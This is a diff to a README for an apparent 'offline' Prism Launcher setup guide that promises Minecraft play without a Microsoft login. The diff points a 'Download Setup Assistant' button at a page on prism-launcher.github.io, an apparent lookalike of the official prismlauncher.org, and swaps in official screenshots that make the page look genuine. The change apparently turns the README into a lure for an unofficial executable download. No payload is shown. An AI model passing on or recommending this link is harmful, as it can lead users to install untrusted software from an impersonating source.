@@ -1,6 +1,6 @@
 # Prism Launcher — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=github)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=github)](https://prism-launcher.github.io/.github/)
 
 > 📦 A complete offline deployment solution for Prism Launcher — no Microsoft login, no internet access, full instance and modpack support.
 
@@ -50,20 +50,13 @@ Follow these steps to deploy Prism Launcher without internet or account login:
 Here are some screenshots showcasing the offline setup and launcher interface:
 
 ### 🔸 Launcher Interface
-![Prism Launcher Interface](https://example.com/prism-launcher-interface.png)  
-*Clean UI with multiple Minecraft modded instances ready to launch*
+![Prism Launcher Interface](https://prismlauncher.org/img/built/w2wXVC7rR1-1030.webp)  
 
 ### 🔸 Modpack Configuration
-![Modpack Setup](https://example.com/prism-launcher-modpack-setup.png)  
-*Offline mod loader selection and modpack customization*
-
-### 🔸 Account Management
-![Offline Account Screen](https://example.com/prism-launcher-offline-account.png)  
-*Offline account login menu with skin preview and UUID settings*
+![Modpack Setup](https://prismlauncher.org/img/built/D0UaL_M1fr-848.webp)  
 
 ### 🔸 Instance Dashboard
-![Instance List](https://example.com/prism-launcher-instances.png)  
-*All configured instances managed without online sync*
+![Instance List](https://prismlauncher.org/img/built/HBZg_bOREW-960.webp) 
 
 ---
 
